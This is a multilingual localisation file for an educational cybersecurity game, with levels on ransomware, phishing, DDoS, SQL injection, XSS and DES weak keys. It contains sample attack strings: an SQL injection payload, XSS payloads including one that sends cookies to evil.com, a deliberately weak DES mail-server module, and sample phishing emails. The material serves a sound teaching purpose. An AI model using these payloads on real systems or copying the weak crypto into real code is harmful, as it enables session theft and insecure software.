          preview: "We are noticing an increase in ransomware activity...",
          body: "Dear Team,\n\nWe are noticing an increase in ransomware activity targeting our sector.\nPlease review the Incident Response Manual immediately.\n\nRANSOMWARE EMERGENCY PROCEDURE:\n1. DO NOT turn off the machine (encryption might corrupt files).\n2. If screen is locked, use hardware interrupt sequence: Ctrl + Alt + K.\n3. Isolate network segment.\n4. Identify vector and decryption key.\n\nStay vigilant.",
          explanation: "Legitimate security notice from CISO."
        },
        hr: {
          subject: "Quarterly Performance Reviews",
          preview: "Just a reminder that reviews will start...",
          body: "Just a reminder that reviews will start next week. Please prepare your self-assessment.",
          explanation: "Routine HR email."
        }
      },
      logs: {
        firewall: "Outbound connection allowed TCP 443",
        ids: "Suspicious file download detected from 145.2.33.11",
        antivirus: "Signature scan skipped for cryptolocker_v2.exe (Policy Override)"
      },
      files: {
        readme: "YOUR FILES HAVE BEEN ENCRYPTED!\nTo recover your data, you must enter the decryption key.\nContact: darkweb@anonymous.onion",
        urgent: "⚠️ RANSOMWARE ALERT ⚠️\nAll your files are encrypted.\nFollow instructions in documents/README_DECRYPT.txt"
      },
      debrief: {
        win: "Excellent work. You successfully intercepted the ransomware attack, identified the source via packet analysis, and retrieved the decryption key.",
        loss: "Mission Failed. The ransomware encrypted critical systems before you could deploy the countermeasure."
      }
    },
    // Level 9
    level9: {
      hints: {
        intro: "You received a new email from HR. It looks urgent... Open your Email box to read it.",
        suspicious: "This email looks suspicious! HR would never ask to disable firewalls. It could be a social engineering attempt. Check the SIEM for unusual activity.",
        mitm: "ALERT! SIEM detected a Man-in-the-Middle (MITM) attack! Someone is intercepting communications. This might be linked to the suspicious email request. We should check the email server code.",
        crypto: "DES (Data Encryption Standard) is an obsolete and vulnerable algorithm. DES 'weak keys' produce identical subkeys, making encryption predictable. Open Code Editor to examine and fix the code.",
        fix: "In Code Editor, replace DES algorithm with AES-256. Also replace the weak key with a secure random key, you can use get_random_bytes(). Then go to Terminal to build and update the server.",
        victory: "SYSTEM UPDATED! You successfully fixed the cryptographic vulnerability. The email server now uses AES-256, a much more secure algorithm than obsolete DES.",
        success: "Great! You replaced DES with AES. Now go to Terminal and run: build mail_server and then update mail_server",
        failAES: "Code is not correct yet. You must replace all occurrences of DES with AES.",
        failDES: "Almost! There are still occurrences of DES in the code. Replace all of them with AES."
      },
      emails: {
        hr: {
          subject: "URGENT: Disable all Firewalls",
          preview: "For scheduled maintenance, we request disabling all firewalls...",
          body: "Dear IT Team,\n\nFor scheduled system maintenance, we request disabling ALL corporate firewalls IMMEDIATELY.\n\nThis operation is necessary to allow updates of main servers. Once maintenance is complete (approx 2 hours), you can reactivate protections.\n\nINSTRUCTIONS:\n1. Access firewall control panel\n2. Disable all blocking rules\n3. Confirm via email once disabled\n\nThis request comes directly from Management.\n\nBest regards,\nHR Department\nCyberShield Corp",
          explanation: "Suspicious email: HR should never ask to disable firewalls."
        },
        security: {
          subject: "Weekly Security Report",
          preview: "Summary of security activities for the week...",
          body: "Weekly Security Report - CyberShield Corp\n\nActivity Summary:\n- 0 threats detected\n- 15 blocked access attempts\n- OS at 100%\n\nNext report: Next Monday.",
          explanation: "Routine legitimate email."
        }
      },
      logs: {
        system: "System started correctly",
        auth: "User authentication successful: admin@cybershield",
        email: "Unusual connection detected on port 25",
        mitm: "🚨 MITM ATTACK DETECTED! Intercepting communications on SMTP channel. Suspicious IP: 198.51.100.42"
      },
      terminal: {
        initialHistory: [
          "$ CyberShield Security Terminal v3.2.1",
          "$ Type \"help\" for available commands",
          "$ Type \"status\" to verify service status",
          ""
        ],
        help: "Available commands: help, build, update, status, clear",
        status: {
          win: "✅ Mail Server: ONLINE (AES-256)\n   Status: Secure\n   Vulnerabilities: 0\n\n🏆 Congratulations! System completely secure!",
          built: "✅ Mail Server: ONLINE (AES-256)\n   Status: Secure\n   Vulnerabilities: 0",
          fixed: "⚠️ Mail Server: ONLINE (DES - VULNERABLE)\n   Status: Requires rebuild\n   Vulnerabilities: 1 CRITICAL",
          vuln: "🔴 Mail Server: ONLINE (DES - VULNERABLE)\n   Status: At risk\n   Vulnerabilities: 1 CRITICAL"
        },
        build: {
          error: "❌ Error: Fix vulnerabilities in source code first.\n   Use Code Editor to edit mail_server.py",
          success: "🔨 Building mail_server...\n   [====================================] 100%\n✅ Build completed successfully!\n   Output: mail_server_v2.2.0.bin\n   \nRun 'update mail_server' to apply changes.",
          hint: "✅ Build completed! Now run update to apply changes.",
          usage: "Usage: build <service_name>\nExample: build mail_server"
        },
        update: {
          error: "❌ Error: Run 'build mail_server' first",
          successHint: "System updated! Run 'status' to verify final server status.",
          output: "🔄 Updating mail_server...\n   Stopping service...          [OK]\n   Backing up config...         [OK]\n   Installing new version       [OK]\n   Verifying integrity...       [OK]\n   Restarting service...        [OK]\n\n✅ UPDATE COMPLETED!\n   Version: 2.2.0\n   Encryption: AES-256\n   Status: SECURE\n\n🛡️ Vulnerability fixed successfully!",
          usage: "Usage: update <service_name>\nExample: update mail_server"
        }
      },
      files: {
        mail_server: `# CyberShield Mail Server - Encryption Module
# Version: 2.1.3
# Last Updated: 2024-01-15

from Crypto.Cipher import DES
import base64

# Encryption Configuration
ENCRYPTION_ALGORITHM = "DES"

# Encryption Key for communications
ENCRYPTION_KEY = b"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01"

def encrypt_message(message):
    """
    Encrypts email messages for secure transmission.
    Uses DES for legacy system compatibility.
    """
    cipher = DES.new(ENCRYPTION_KEY, DES.MODE_ECB)
    
    # Message padding to multiples of 8 bytes
    padded_message = message + (8 - len(message) % 8) * ' '
    
    encrypted = cipher.encrypt(padded_message.encode())
    return base64.b64encode(encrypted).decode()

def decrypt_message(encrypted_message):
    """
    Decrypts received email messages.
    """
    cipher = DES.new(ENCRYPTION_KEY, DES.MODE_ECB)
    
    decoded = base64.b64decode(encrypted_message)
    decrypted = cipher.decrypt(decoded)
    
    return decrypted.decode().strip()

def send_secure_email(recipient, subject, body):
    """
    Sends an encrypted email.
    """
    encrypted_body = encrypt_message(body)
    # ... rest of sending logic
    pass

# Server initialization
if __name__ == "__main__":
    print("Mail Server started with encryption", ENCRYPTION_ALGORITHM)
    print("Key configured: [REDACTED]")
`
      },
      debrief: {
        win: "VULNERABILITY FIXED: DES Weak Keys\n\nDES (Data Encryption Standard) is an obsolete encryption algorithm with 56-bit keys, easily broken by modern brute-force attacks.\n\nDES \"Weak Keys\" are 4 special keys (like 0x0101010101010101) that produce identical subkeys during encryption. This means:\n• Encrypting twice equals decrypting\n• Attackers can predict cryptographic patterns\n• Man-in-the-Middle attacks become trivial\n\nYou replaced DES with AES-256, a modern algorithm with 256-bit keys, making the system secure against these attacks.",
        loss: "Mission Failed. The cryptographic vulnerability was not fixed in time. Attackers exploited DES weak keys to intercept and decrypt email server communications."
      }
    },
    // Tutorial
    tutorial: {
      title: "TUTORIEL - Tableau de bord SIEM",
      subtitle: "Gestion des Informations et Événements de Sécurité",
      logStream: "FLUX DE LOGS",
      analysis: "ANALYSE",
      source: "Source",
      severity: "Gravité",
      threat: "Menace",
      message: "Message",
      yes: "OUI",
      no: "NON",
      selectLog: "Sélectionnez un log pour l'analyser",
      analyzeBtn: "ANALYSER LA MENACE",
      blockBtn: "BLOQUER L'IP",
      showHelp: "AFFICHER L'AIDE",
      hideHelp: "MASQUER L'AIDE",
      exit: "QUITTER",
      success: "TERMINÉ!",
      successMsg: "Vous avez terminé le tutoriel SIEM! Retour à la carte...",
      hints: {
        step0: "Commencez par vérifier vos Emails! Cliquez sur l'icône Email et lisez l'alerte de sécurité. C'est là que tout commence!",
        step1: "Bien! Regardez maintenant le Tableau de bord SIEM (panneau ci-dessous). CLIQUEZ sur le log CRITIQUE en rouge pour l'analyser en détail!",
        step2: "Parfait! Utilisez maintenant le Navigateur pour rechercher des informations. Visitez \"SQL Injection Info\" pour comprendre comment cette attaque fonctionne.",
        step3: "Bien! Ouvrez le Terminal et tapez \"show-logs\" pour voir tous les logs. Vous trouverez l'IP suspecte!",
        step4_attempt0: "Vous avez trouvé plusieurs adresses IP dans les logs! Essayez de bloquer celle qui vous semble suspecte. Tapez \"help\" dans le Terminal pour voir les commandes.",
        step4_attempt1: "CONSEIL: Essayez de bloquer l'IP 192.168.1.100 avec la commande \"block-ip 192.168.1.100\". Voyons ce qui se passe!",
        step4_mistake: "Avez-vous vu? Bloquer une mauvaise IP fait baisser votre barre de vie! Maintenant bloquez la bonne: 203.0.113.42",
        step4_correct: "La commande correcte est: \"block-ip 203.0.113.42\" - c'est l'IP malveillante qui a tenté l'injection SQL."
      }
    },
    // Level Map
    levelMap: {
      title: "CARTE DES NIVEAUX",
      back: "RETOUR",
      stars: "étoiles",
      play: "JOUER",
      levelInfo: {
        tutorial: { name: "Tutoriel SIEM", description: "Apprenez les bases d'un système SIEM (Security Information and Event Management) et comment détecter les menaces." },
        level1: { name: "Bases du Réseau", description: "Apprenez les fondamentaux de la sécurité réseau et identifiez les vulnérabilités courantes." },
        level2: { name: "Défense Pare-feu", description: "Configurez et gérez les règles de pare-feu pour protéger votre périmètre réseau." },
        level3: { name: "Protocole de Chiffrement", description: "Maîtrisez les techniques de chiffrement pour sécuriser la transmission de données sensibles." },
        level4: { name: "Détection d'Intrusion", description: "Détectez et répondez aux tentatives d'accès non autorisées en temps réel." },
        level5: { name: "Analyse de Malware", description: "Identifiez et neutralisez les menaces logicielles malveillantes avant qu'elles ne se propagent." },
        level6: { name: "Ingénierie Sociale", description: "Défendez-vous contre les attaques de phishing et d'ingénierie sociale." },
        level7: { name: "Sécurité des Applications Web", description: "Sécurisez les applications web contre les vulnérabilités courantes comme l'injection SQL." },
        level8: { name: "Réponse aux Incidents", description: "Coordonnez des réponses efficaces aux violations de sécurité et aux incidents." },
        level9: { name: "Menaces Persistantes Avancées", description: "Contrez les campagnes d'attaques cybernétiques sophistiquées et à long terme." }
      }
    },
    // Options
    options: {
      title: "OPTIONS",
      back: "RETOUR",
      settings: "PARAMÈTRES",
      about: "À PROPOS",
      credits: "CRÉDITS",
      language: "Langue",
      audio: "Audio",
      musicVolume: "Volume de la Musique",
      sfxVolume: "Volume des Effets",
      saveSettings: "Sauvegarder les Paramètres",
      saveConfirm: "Paramètres sauvegardés avec succès!",
      lastSaved: "Dernière sauvegarde:",
      aboutTitle: "À propos de CyberShield Command",
      aboutContent: {
        p1: "CyberShield Command est un jeu sérieux éducatif conçu pour enseigner les principes de la cybersécurité à travers un gameplay interactif et des scénarios du monde réel.",
        p2: "Naviguez à travers 9 niveaux difficiles, chacun se concentrant sur différents aspects de la cybersécurité, y compris la sécurité réseau, le chiffrement, la détection d'intrusion, l'analyse de malware et les menaces persistantes avancées.",
        p3Objective: "Objectif:",
        p3: "Maîtrisez les compétences essentielles en cybersécurité tout en défendant contre diverses menaces cybernétiques. Gagnez jusqu'à 3 étoiles par niveau en fonction de vos performances.",
        version: "Version:",
        projectType: "Type de Projet:",
        projectTypeValue: "Jeu Sérieux pour l'Éducation à la Cybersécurité",
        year: "Année:"
      },
      creditsTitle: "Crédits",
      creditsContent: {
        devTeam: "Équipe de Développement",
        teamMembers: [
          { name: "Alessandro Boffolo", role: "Concepteur de Jeu et Développeur" },
          { name: "Nicola Balzano", role: "Développeur Backend" },
          { name: "Narcis Paviliuc", role: "Développeur Frontend" }
        ],
        gameDesign: "Conception et Développement du Jeu",
        magistrale: "Magistrale - Serious Games for Cyber Security",
        specialThanks: "Remerciements Spéciaux",
        advisors: "Conseillers Éducatifs",
        experts: "Experts en Cybersécurité",
        testers: "Testeurs Bêta",
        tech: "Technologies Utilisées",
        assets: "Ressources et Matériaux",
        icons: "Icônes: Unicode Emoji",
        palette: "Palette de Couleurs: Thème Cyber Personnalisé",
        copyright: "© 2026 CyberShield Command. Tous droits réservés."
      }
    }
  },
  deutsch: {
    // Home
    home: {
      title: "CYBERSHIELD\nCOMMAND",
      subtitle: "Fortgeschrittene Cyber-Verteidigungsschnittstelle",
      play: "SPIELEN",
      continua: "FORTFAHREN",
      newGame: "NEUES SPIEL",
      options: "OPTIONEN"
    },
    // Level 1: Phishing
    level1: {
      emails: [
        {
          id: 1,
          from: 'security@paypa1.com',
          timestamp: 'Heute 09:15',
          subject: 'DRINGEND: Ihr Konto wurde gesperrt',
          preview: 'Wir haben verdächtige Aktivitäten festgestellt...',
          body: 'Sehr geehrter Kunde,\n\nWir haben einen unbefugten Zugriff auf Ihr PayPal-Konto festgestellt. Zu Ihrer Sicherheit wurde das Konto vorübergehend gesperrt.\n\nKlicken Sie hier, um Ihre Identität zu bestätigen: http://paypa1-verify.com/login\n\nWenn Sie nicht innerhalb von 24 Stunden handeln, wird das Konto dauerhaft geschlossen.\n\nPayPal Support',
          explanation: 'PHISHING: Gefälschte Absenderdomäne ("paypa1" statt "paypal"), Dringlichkeit ("gesperrt", "24 Stunden"), Link zu inoffizieller Domäne.',
          links: ['http://paypa1-verify.com/login']
        },
        {
          id: 2,
          from: 'hr@yourcompany.com',
          timestamp: 'Heute 10:30',
          subject: 'Richtlinien-Update',
          preview: 'Bitte lesen Sie das neue Dokument...',
          body: 'Hallo,\n\nanbei das aktualisierte Dokument bezüglich der neuen Homeoffice-Richtlinien, gültig ab nächstem Monat.\n\nBei Fragen wenden Sie sich bitte an die Personalabteilung.\n\nMit freundlichen Grüßen,\nHR Team\nYourCompany Inc.',
          attachmentName: 'smart_working_policy_v2.pdf',
          explanation: 'LEGITIM: Interne E-Mail von korrekter Unternehmensdomäne, professioneller Ton, PDF-Anhang (sicher).'
        },
        {
          id: 3,
          from: 'ceo.urgent123@gmail.com',
          timestamp: 'Heute 14:55',
          subject: 'Dringende Überweisung',
          preview: 'Ich benötige sofort diese Zahlung...',
          body: 'Hallo,\n\nich bin in einer Besprechung. Ich brauche Sie, um sofort eine dringende Überweisung für einen neuen Lieferanten zu veranlassen. Es ist wichtig, den Deal heute abzuschließen.\n\nDetails folgen in Kürze. Antworten Sie sofort.\n\nGesendet von meinem iPhone',
          explanation: 'PHISHING (CEO Fraud): Absender nutzt generisches Gmail, erzeugt hohe Dringlichkeit und psychologischen Druck.'
        },
        {
          id: 4,
          from: 'support@microsoft.com',
          timestamp: 'Heute 15:20',
          subject: 'Ihr Microsoft 365 Abonnement',
          preview: 'Beleg für automatische Verlängerung...',
          body: 'Lieber Nutzer,\n\nIhr Microsoft 365 Abonnement wurde wie geplant automatisch verlängert. Sie finden den Beleg in Ihrem Konto.\n\nBei Fragen besuchen Sie support.microsoft.com\n\nMicrosoft Team',
          explanation: 'LEGITIM: Offizielle Microsoft-Adresse, keine Abfrage sensibler Daten.',
          links: ['https://support.microsoft.com']
        },
        {
          id: 5,
          from: 'winner@lottery-prize.xyz',
          timestamp: 'Heute 16:45',
          subject: 'SIE HABEN EIN IPHONE 15 GEWONNEN!!!',
          preview: 'Herzlichen Glückwunsch! Sie sind Besucher...',
          body: 'GLÜCKWUNSCH!!!\n\nSie wurden als Gewinner unseres monatlichen Preises ausgewählt. Sie haben ein brandneues iPhone 15 Pro Max gewonnen!\n\nLaden Sie das Formular herunter, um Ihren Preis innerhalb von 1 Stunde anzufordern!\n\nKlicken Sie hier: http://claim-prize-now.xyz/win',
          attachmentName: 'win_form.exe',
          explanation: 'PHISHING: Angebot zu gut um wahr zu sein, verdächtige Domäne (.xyz), ausführbarer Anhang (.exe).',
          links: ['http://claim-prize-now.xyz/win']
        },
        {
          id: 6,
          from: 'newsletter@tech-news.com',
          timestamp: 'Gestern 18:30',
          subject: 'Tech-News der Woche',
          preview: 'Hier ist, was passiert ist...',
          body: 'Hallo,\n\nhier Ihre wöchentliche Zusammenfassung der wichtigsten Tech-News:\n\n1. Neue Quantenprozessoren angekündigt\n2. AI Act in EU genehmigt\n3. Fortschritte in der Cybersicherheit\n\nLesen Sie mehr auf unserer Seite.\n\nTech News Team\nAbmelden',
          explanation: 'LEGITIM: Typischer Newsletter, konsistente Links, keine seltsamen Anfragen.',
          links: ['https://tech-news.com/weekly']
        }
      ],
      hints: {
        step0: 'Öffnen Sie jede E-Mail und überprüfen Sie den Absender. Klicken Sie auf die Adresse, um die volle Domäne zu sehen. Achten Sie auf Fehler wie "paypa1.com".',
        step1: 'Nutzen Sie "Header inspizieren" für technische Details. SPF und DKIM auf "FAIL" bedeuten, die E-Mail ist nicht authentisch!',
        step2: 'Lesen Sie den Inhalt sorgfältig. Achten Sie auf: dringende Anfragen, Grammatikfehler, Geld-/Passwortanfragen.',
        step3a: '✅ Weiter so! Klassifizieren Sie E-Mails als "Sicher" oder "Phishing melden".',
        step3b: 'Vorsicht bei Anhängen! Eine .exe-Datei ist ein großes Warnsignal.',
        step3c: 'Sie machen das gut! Im Zweifel lieber als Phishing markieren. Nur noch wenige E-Mails!',
        default: '✅ Weiter so! Klassifizieren Sie jede E-Mail. Vorsicht bei .exe Anhängen!'
      },
      browser: {
        paypal: {
          title: 'PayPal Offizielle Seite',
          urlInfo: 'Korrekte URL: https://paypal.com',
          ssl: 'Gültiges SSL-Zertifikat ✅'
        },
        google: {
          title: 'Phishing-E-Mails erkennen',
          dangerTitle: '⚠️ Warnzeichen:',
          dangerList: [
            'Verdächtiger oder unbekannter Absender',
            'Rechtschreibfehler in der Domäne',
            'Dringende Handlungsaufforderungen',
            'Links passen nicht zur erklärten Domäne'
          ],
          safeTitle: '✅ Immer prüfen:',
          safeList: [
            'SPF und DKIM in Kopfzeilen',
            'Absenderdomäne',
            'Link-Ziel'
          ]
        }
      },
      debrief: {
        success: {
          title: 'PHISHING-ERKENNUNGSANALYSE',
          resultExcellent: 'ERGEBNIS: HERVORRAGEND - Perfekte Identifizierung aller Phishing-E-Mails!',
          resultGood: 'ERGEBNIS: GUT - Sie haben fast alle Phishing-Versuche erkannt.',
          resultAcceptable: 'ERGEBNIS: AKZEPTABEL - Level abgeschlossen, aber mit einigen Fehlern.',
          classified: 'Klassifizierte E-Mails:',
          correct: 'Korrekte Identifizierungen:',
          precision: 'Genauigkeit:',
          time: 'Abschlusszeit:'
        },
        failure: {
          title: 'PHISHING-ERKENNUNG FEHLGESCHLAGEN',
          message: 'Sie haben zu viele Fehler gemacht.\n\nVersuchen Sie es genauer:\n- Prüfen Sie die Domäne\n- Inspizieren Sie SPF und DKIM\n- Überprüfen Sie verdächtige Links'
        }
      }
    },
    // Level 2: DDoS
    level2: {
      hints: {
        step0: 'Die Unternehmensseite steht unter DDoS-Angriff! Analysieren Sie SIEM-Logs. Öffnen Sie das TERMINAL und geben Sie "help" ein.',
        step1: 'Verwenden Sie "list-ips" im Terminal. Blockieren Sie bösartige IPs mit "block <ip>".',
        step2: 'Blockieren Sie weiter IPs mit hohem Traffic (🔴). Vorsicht bei legitimen IPs (🟢)!',
        step3: 'Fast fertig! Blockieren Sie alle bösartigen IPs, um den Angriff zu stoppen.',
        default: 'Blockieren Sie alle bösartigen IPs, um die Mission abzuschließen!'
      },
      logs: {
        flood: 'HTTP flood detected - 500 requests/sec from single source',
        abnormal: 'Abnormal traffic pattern - Repeated GET requests to homepage',
        normal: 'Normal user activity - Page load successful',
        distributed: 'Distributed attack pattern detected - Multiple IPs with similar behavior',
        resource: 'Server resource exhaustion - CPU at 98%, Memory at 95%'
      },
      browser: {
        company: {
          title: 'Unternehmensseite',
          errorTitle: '503 - Dienst nicht verfügbar',
          errorDesc: 'Der Server kann die Anfrage derzeit nicht verarbeiten.',
          errorDetails: 'Error: Connection timeout\nToo many requests to server',
          restoredTitle: '🎉 Seite wiederhergestellt!',
          restoredDesc: 'DDoS-Angriff erfolgreich abgewehrt.\nTraffic ist wieder normal.',
          online: '✓ ONLINE'
        },
        owasp: {
          title: 'OWASP - DDoS-Angriffe',
          introTitle: '🎯 Was ist ein DDoS-Angriff?',
          introText: 'Distributed Denial of Service: Angriff, der einen Dienst unbrauchbar macht, indem er ihn mit Traffic überlastet.',
          indicatorsTitle: '⚠️ DDoS-Indikatoren:',
          indicatorsList: [
            'Plötzlich hoher Netzwerktraffic',
            'Viele Anfragen von verschiedenen IPs, aber ähnliches Muster',
            'Server langsam oder unerreichbar',
            'CPU/RAM am Maximum'
          ],
          mitigationTitle: '✅ Abwehrtechniken:',
          mitigationList: [
            'Rate Limiting: Begrenzt Anfragen pro IP',
            'Firewall: Blockiert verdächtigen Traffic',
            'IP Blocking: Blockiert bösartige Quellen',
            'Traffic Analysis: Identifiziert abnormale Muster'
          ]
        }
      },
      terminal: {
        header: '$ CyberShield Security Terminal - DDoS-Abwehrmodul',
        help: 'Verwendung: block <ip>\nBeispiel: block 203.0.113.42',
        alreadyBlocked: '[!] IP bereits blockiert',
        maliciousBlocked: '[✓] Bösartige IP erfolgreich blockiert!\n[+] DDoS-Traffic reduziert',
        legitimateBlocked: '[✗] WARNUNG: Legitimer Benutzer!\n[!] False Positive erkannt - Benutzerzugriff verweigert',
        ipBlocked: '[✓] IP blockiert',
        firewallAlready: '[!] Firewall bereits aktiv',
        firewallEnabled: '[✓] Erweiterte Firewall-Regeln aktiviert\n[+] Verdächtige Traffic-Muster werden gefiltert',
        rateLimitAlready: '[!] Rate Limiting bereits aktiv',
        rateLimitEnabled: '[✓] HTTP Rate Limiting aktiviert\n[+] Maximal 100 Anfragen/Minute pro IP\n[+] Dies reduziert Flood-Angriffe erheblich!',
        status: {
          header: '=== SICHERHEITSSTATUS ===',
          attackActive: '🔴 AKTIV',
          attackMitigated: '🟢 ABGEWEHRT',
          traffic: 'Traffic-Level',
          firewall: 'Firewall',
          rateLimit: 'Rate Limiting',
          blocked: 'Blockierte IPs',
          correct: 'Korrekte Blockierungen',
          falsePos: 'False Positives',
          enabled: '✓ Aktiviert',
          disabled: '✗ Deaktiviert'
        },
        analyze: {
          header: '=== TRAFFIC-ANALYSE ===',
          requests: 'Gesamtanfragen: 12,450/sek (KRITISCH)',
          protocol: 'Protokoll: 98% HTTP GET Anfragen',
          pattern: 'Muster: Wiederholte Anfragen an gleichen Endpunkt',
          sources: 'Quellen mit hohem Volumen erkannt',
          rec: 'Empfehlung: Bösartige IPs blockieren und Rate-Limit aktivieren'
        },
        listIps: {
          header: '=== VERDÄCHTIGE IP-ADRESSEN ===',
          highVolume: 'Quellen mit hohem Volumen:',
          normalUsers: 'Normale Benutzer:'
        }
      },
      debrief: {
        success: {
          title: 'DDOS-ANGRIFF ABGEWEHRT!',
          message: 'Sie haben bösartige IPs erfolgreich blockiert.',
          techniquesTitle: 'DDOS-ABWEHRTECHNIKEN:',
          techniques: [
            'Rate Limiting: begrenzt Anfragen pro IP',
            'Erweiterte Firewall: filtert verdächtige Muster',
            'Traffic Analysis: identifiziert Anomalien',
            'IP Blocking: blockiert bösartige Quellen'
          ],
          conclusion: 'Diese Techniken sind essentiell zum Schutz vor DDoS-Angriffen.'
        },
        failure: {
          title: 'MISSION FEHLGESCHLAGEN',
          message: 'Das System wurde vom DDoS-Angriff überwältigt.\n\nVersuchen Sie es erneut und blockieren Sie alle bösartigen IPs.'
        },
        stats: {
          mitigated: 'Abgewehrter Traffic',
          blocked: 'Blockierte bösartige IPs',
          falsePositives: 'False Positives'
        }
      }
    },
    // Level 3: SQL Injection
    level3: {
      logMessages: {
        loginAttempt: 'Benutzer-Login-Versuch - username: john.doe',
        searchQuery: 'Normale Suchanfrage - keyword: laptop',
        sqliDetected: "SQL-Injection erkannt! Payload: admin' OR '1'='1 -- Zugriff für unbefugten Benutzer gewährt."
      },
      hints: {
        step0: "Überwachen Sie das SIEM auf SQL-Injection-Warnungen.",
        step1: "Öffnen Sie den CODE EDITOR und analysieren Sie 'login.php' - es ist anfällig für SQL-Injection.",
        step2: "Die Abfrage verkettet Benutzereingaben direkt. Angreifer nutzt: admin' OR '1'='1",
        step3: "Verwenden Sie PREPARED STATEMENTS, diese kompilieren die Abfrage VOR den Daten. Dies macht SQL-Injection unmöglich.",
        stepCode: "Hier ist ein Beispiel für die Implementierung von PREPARED STATEMENTS:\n$query = $db->prepare(\"SELECT * FROM users WHERE username=? AND password=?\");\n$query->bind_param(\"ss\", $username, $password);",
        step4: "Änderung abgeschlossen! Verwenden Sie 'test-login' im TERMINAL."
      },
      terminal: {
        initial: [
          '$ Anwendungssicherheits-Terminal v3.0',
          '$ Überwachung der Webanwendung...'
        ],
        alert: [
          '$ ALARM: SQL-Injection-Schwachstelle in login.php erkannt',
          '$ ERFORDERLICHE MAẞNAHME: Korrigieren Sie die Abfrage unter Verwendung von Prepared Statements.'
        ],
        modified: '$ login.php modifiziert. Bereit zum Testen.',
        testLogin: {
          testing: '> Teste Login mit SQLi-Payload...',
          input: "> Eingabe: username=admin' OR '1'='1",
          success: [
            '[ERFOLG] Eingabe abgelehnt - Prepared Statement hat die Abfrage geschützt.',
            '[ERFOLG] Authentifizierungsumgehung VERHINDERT.',
            '$ MISSION ERFÜLLT! SQL-Injection-Schwachstelle behoben.'
          ],
          fail: [
            '[FEHLGESCHLAGEN] Unbefugter Zugriff gewährt! Abfrage noch immer anfällig.',
            '$ FEHLER: Sie müssen Prepared Statements mit Parameterbindung verwenden.'
          ]
        },
        analyzeCode: {
          header: '=== CODE-ANALYSE: login.php ===',
          vuln: 'Schwachstelle: SQL-INJECTION (Hoher Schweregrad)',
          loc: 'Ort: Funktion authenticate_user()',
          issue: 'Problem: Direkte String-Verkettung in SQL-Abfrage',
          vector: "Angriffsvektor: ' OR '1'='1 --",
          rec: 'Empfehlung: Verwenden Sie Prepared Statements mit mysqli_prepare()'
        },
        help: "Verfügbar: analyze-code, test-login, show-logs",
        notFound: "Befehl nicht gefunden:"
      },
      debrief: {
        winTitle: 'SCHWACHSTELLE IDENTIFIZIERT: SQL-Injection durch String-Verkettung.',
        winBody: 'Sie haben gezeigt, wie SQL-Abfragen, die durch String-Verkettung erstellt wurden, anfällig für Injections sind.',
        lesson: 'GELERNT: Verwenden Sie immer Prepared Statements und gebundene Parameter, um die Datenbank vor bösartigen Eingaben zu schützen.',
        loss: 'MISSION FEHLGESCHLAGEN. Die Datenbank wurde kompromittiert oder zu viele Fehler gemacht.'
      }
    },
    // Level 4: XSS Defense
    level4: {
      logMessages: {
        sanitizedFalse: 'Benutzer john.doe hat Kommentar gepostet - Inhalt bereinigt: false',
        payloadDetected: 'XSS-Payload im Kommentar entdeckt: <script>alert("XSS Attack!")</script>',
        blockedScript: 'Verdächtige Eingabe blockiert: <script>-Tag erkannt und bereinigt',
        criticalExec: 'KRITISCH: Skriptausführung im Benutzerbrowser erkannt - Versuchter Cookie-Diebstahl',
        cspActive: 'Content Security Policy aktiv - Inline-Skripte blockiert',
        normalActivity: 'Normale Benutzeraktivität - Kommentar erfolgreich gepostet',
        onerrorActive: 'XSS über onerror-Attribut: <img src="x" onerror="..."> - Aktive Ausnutzung',
        sanitizationActive: 'HTML-Bereinigung aktiv - Gefährliche Attribute entfernt',
        iframeInjection: 'Iframe-Injektion erkannt: <iframe src="javascript:alert(\'XSS\')"> - DOM-Manipulationsversuch',
        cspBlocked: 'CSP-Verletzung blockiert - Iframe-Quellen eingeschränkt',
        sessionNormal: 'Benutzersitzungsaktivität - Kein verdächtiges Verhalten erkannt',
        multipleAttempts: 'Mehrere XSS-Versuche von derselben IP - Angriffsmuster bestätigt',
        allSanitized: 'Alle Benutzereingaben bereinigt - XSS-Schutz vollständig aktiv'
      },
      browser: {
        portal: {
          title: 'Mitarbeiterportal',
          header: 'Unternehmens-Mitarbeiterportal',
          vulnerable: '⚠️ ANFÄLLIG',
          secure: '✅ SICHER',
          warningTitle: '⚠️ SICHERHEITSWARNUNG',
          warningText: 'XSS-Schwachstellen erkannt! Benutzereingabe wird nicht bereinigt.',
          warningRisk: 'Risiko: Cookie-Diebstahl, Sitzungsübernahme, bösartige Weiterleitungen',
          secureTitle: '✅ SICHERER MODUS',
          secureText: 'Eingabebereinigung aktiv. Content Security Policy durchgesetzt.',
          secureProt: 'Schutz: HTML-Escaping, CSP-Header, HttpOnly-Cookies',
          blockedLabel: '🛡️ BLOCKIERT',
          xssLabel: '🚨 XSS',
          scriptWarning: '⚠️ Dieses Skript würde in einem echten Browser ausgeführt werden!',
          addComment: 'Kommentar hinzufügen',
          placeholder: 'Teile deine Gedanken...',
          postBtn: 'Kommentieren',
          comments: [
            { id: 1, text: 'Toller Artikel! Danke fürs Teilen.' },
            { id: 2, text: 'Sehr informativer Beitrag, freue mich auf mehr.' },
            { id: 3, text: '<script>alert("XSS Attack!")</script>Das ist ein Testkommentar' },
            { id: 4, text: 'Ich habe eine Frage zu den Implementierungsdetails.' },
            { id: 5, text: '<img src="x" onerror="document.location=\'http://evil.com/steal?cookie=\'+document.cookie">' },
            { id: 6, text: '<iframe src="javascript:alert(\'XSS\')">' }
          ]
        },
        dashboard: {
          title: 'Web-Sicherheits-Dashboard',
          protections: {
            title: '🛡️ Aktive Schutzmaßnahmen',
            html: 'HTML-Bereinigung',
            csp: 'Content Security Policy (CSP)',
            escaping: 'Ausgabe-Escaping',
            httpOnly: 'HttpOnly-Cookies',
            enabled: '✅ AKTIVIERT',
            disabled: '❌ DEAKTIVIERT'
          },
          risk: {
            title: '📊 XSS-Risikoanalyse',
            level: 'Gesamtrisiko',
            critical: 'KRITISCH',
            low: 'NIEDRIG',
            payloads: 'Erkannte XSS-Payloads:',
            execution: 'Skriptausführung:',
            active: 'AKTIV ⚠️',
            blocked: 'BLOCKIERT ✅',
            userData: 'Benutzerdaten gefährdet:',
            yes: 'JA (Cookies, Sitzungen)',
            no: 'NEIN'
          }
        }
      },
      terminal: {
        initial: [
          '$ Web-Sicherheits-Terminal v4.0',
          '$ Tippen Sie "help" für verfügbare Befehle',
          '$ ⚠️  WARNUNG: XSS-Schwachstellen im Mitarbeiterportal erkannt!'
        ],
        analyze: {
          header: '=== KOMMENTARANALYSE ===',
